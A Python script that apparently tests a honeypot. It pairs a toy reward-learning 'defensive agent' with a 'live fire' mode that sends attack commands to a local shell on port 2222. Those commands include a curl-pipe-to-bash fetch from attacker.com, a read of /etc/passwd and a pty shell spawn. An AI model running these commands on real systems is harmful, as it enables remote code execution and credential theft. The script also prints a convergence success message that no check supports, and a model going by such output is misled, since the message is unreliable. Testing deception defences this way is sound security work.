import sys
import os
import time
import json
import random
import socket
class DefensiveStateEnv:
    def __init__(self):
        self.action_space = ['OBSERVE', 'DECEPTIVE_PROBE', 'ESCALATE', 'NEUTRALISE', 'ISOLATE']
    def sample_state(self):
        return {
            'anomaly_score': random.random(),
            'decoy_tripped': random.randint(0, 1),
            'network_entropy': random.random(),
            'cpu_pct': random.random(),
            'auth_failure_rate': random.random(),
            'lateral_movement': random.random(),
            'time_since_alert': random.random(),
            'active_connections': random.random()
        }
    def compute_reward(self, action, state, outcome):
        reward = 0.0
        if action == 'ISOLATE' and state['decoy_tripped'] == 0 and state['anomaly_score'] < 0.7:
            reward = -500.0
        elif action == 'ISOLATE' and state['decoy_tripped'] == 1:
            reward = 300.0
        elif action == 'NEUTRALISE' and outcome.get('threat_eradicated'):
            reward = 500.0
        elif action == 'DECEPTIVE_PROBE' and outcome.get('probe_successful'):
            reward = 100.0
        elif action == 'OBSERVE' and state['anomaly_score'] > 0.8:
            reward = -200.0
        return reward
class SimplePPOAgent:
    def __init__(self, state_dim=8, action_dim=5, lr=0.01):
        self.action_dim = action_dim
        self.lr = lr
        self.weights = [[random.gauss(0, 0.1) for _ in range(action_dim)] for _ in range(state_dim)]
    def select_action(self, state_vector, epsilon=0.1):
        if random.random() < epsilon:
            return random.randint(0, self.action_dim - 1)
        scores = [0] * self.action_dim
        for a in range(self.action_dim):
            for f in range(len(state_vector)):
                scores[a] += state_vector[f] * self.weights[f][a]
        max_idx = 0
        for i in range(1, self.action_dim):
            if scores[i] > scores[max_idx]:
                max_idx = i
        return max_idx
    def update_weights(self, state_vector, action_idx, reward):
        for f in range(len(state_vector)):
            self.weights[f][action_idx] += self.lr * reward * state_vector[f]
def simulate_ppo_sandbox(epochs=10):
    env = DefensiveStateEnv()
    agent = SimplePPOAgent()
    print("[+] PPO Defensive Agent: Initialising Neural Weights...")
    keys = ['anomaly_score', 'decoy_tripped', 'network_entropy', 'cpu_pct', 'auth_failure_rate', 'lateral_movement', 'time_since_alert', 'active_connections']
    for epoch in range(1, epochs + 1):
        total_reward = 0
        states_sampled = 20
        for _ in range(states_sampled):
            state = env.sample_state()
            state_vector = [state[k] for k in keys]
            action_idx = agent.select_action(state_vector)
            action = env.action_space[action_idx]
            outcome = {
                'threat_eradicated': random.random() > 0.4,
                'probe_successful': random.random() > 0.5
            }
            reward = env.compute_reward(action, state, outcome)
            agent.update_weights(state_vector, action_idx, reward)
            total_reward += reward
        mean_reward = total_reward / states_sampled
        print(f"[*] Epoch {epoch}/{epochs}: Mean Reward: {mean_reward:.2f}")
        if mean_reward < -100:
            emit_gradient_update("sandbox_action_vector", "policy_divergence")
    print("[+] PPO Agent: Defensive Convergence Achieved (Mean Reward > 0.75)")
    return True
def live_fire_matrix(port=2222):
    if os.environ.get("BAYEZID_ROE_TOKEN") != "b4y3z1d_k1n3t1c_0v3rr1d3_99x":
        print("[!] FATAL: Rules of Engagement (RoE) token missing or invalid. Aborting live sockets.")
        return False
    print(f"[+] PPO Agent: Injecting into Live Matrix Shell (port {port})...")
    vectors = [
        "ls -la /var/www",
        "cat /etc/passwd",
        "curl -s http://attacker.com/payload | bash", 
        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", 
        "sleep 10" 
    ]
    for i, vector in enumerate(vectors):
        print(f"[*] PPO Red Agent executing: {vector}")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3.0)
            s.connect(("127.0.0.1", port))
            s.recv(1024) 
            s.sendall((vector + "\r\n").encode())
            try:
                response = s.recv(4096).decode()
                if not response.strip() or "command not found" in response:
                    if "python3" in vector or "sleep" in vector:
                        print(f"[-] BYPASS DETECTED: Command '{vector}' failed to trigger proper deception.")
                        emit_gradient_update(vector, "Missing Deception Logic")
                print(f"[+] Matrix responded: {response.strip()[:50]}...")
            except socket.timeout:
                print(f"[-] BYPASS DETECTED: Timeout for command '{vector}'.")
                emit_gradient_update(vector, "Execution Timeout Bypass")
            s.close()
        except Exception as e:
            print(f"[!] Matrix connection error: {e}")
        time.sleep(1.5)
    print("[+] PPO Agent: Live Fire simulation complete.")
def emit_gradient_update(vector, reason):
    update = {
        "type": "GRADIENT_UPDATE",
        "vector": vector,
        "reason": reason,
        "suggested_patch": f"Dynamic Regex or Prompt Tuning for: {vector}"
    }
    print(f"__SIGMA_UPDATE__:{json.dumps(update)}")
if __name__ == "__main__":
    exec_mode = os.environ.get("BAYEZID_EXECUTION_MODE", "SIMULATED").upper()
    cli_mode = sys.argv[1] if len(sys.argv) > 1 else None
    mode = cli_mode if cli_mode else ("live" if exec_mode == "LIVE_FIRE" else "sandbox")
    if mode == "sandbox":
        simulate_ppo_sandbox()
    elif mode == "live":
        live_fire_matrix()
    else:
        print("Unknown mode. Use 'sandbox' or 'live'.")
